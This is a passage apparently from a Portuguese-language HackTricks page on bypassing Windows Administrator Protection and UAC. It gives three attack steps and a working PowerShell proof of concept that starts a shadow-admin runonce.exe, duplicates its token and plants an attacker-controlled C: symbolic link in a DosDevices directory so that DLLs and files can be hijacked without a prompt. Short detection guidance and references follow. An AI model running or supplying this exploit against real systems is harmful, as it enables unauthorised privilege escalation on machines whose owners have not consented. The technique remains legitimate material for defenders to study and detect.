1. Em uma sessão com poucos privilégios, chame `RAiProcessRunOnce` para iniciar um `runonce.exe` shadow-admin sem prompt.
2. Duplique o token primário para criar um token de **identificação** e se passe por ele ao abrir `\??` para forçar a criação de `\Sessions\0\DosDevices/<LUID>` sob a propriedade do atacante.
3. Crie ali um link simbólico `C:` apontando para um armazenamento controlado pelo atacante; os acessos subsequentes ao sistema de arquivos nessa sessão resolverão `C:` para o caminho do atacante, permitindo o hijack de DLLs/arquivos sem prompt.

**PoC do PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Em hosts de preview, o Administrator Protection registra aprovações e falhas como eventos ETW **15031** e **15032** no provider `Microsoft-Windows-LUA`. Os eventos incluem o SID do solicitante, o caminho do aplicativo, o resultado, a conta de administrador gerenciada e o método de autenticação, portanto, tentativas repetidas de exploração ou falhas ao controlar a interface não passam despercebidas pela telemetria.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Como funciona o User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Coleção de técnicas de UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilidade e launcher de UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adota IA para gerar backdoors de PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operação TrueChaos: exploração de 0-day contra alvos governamentais do Sudeste Asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contornando a proteção de administrador do Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Contornando o UAC usando a tarefa SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypasses de UnifiedConsent, TabTip e Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Proteção de administrador](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Chamando servidores RPC locais do Windows a partir do .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte aprimora o CoolClient com um rootkit de kernel do Windows assinado](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: um trojan do Windows totalmente indetectável, criado para espionar, roubar e aterrorizar](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
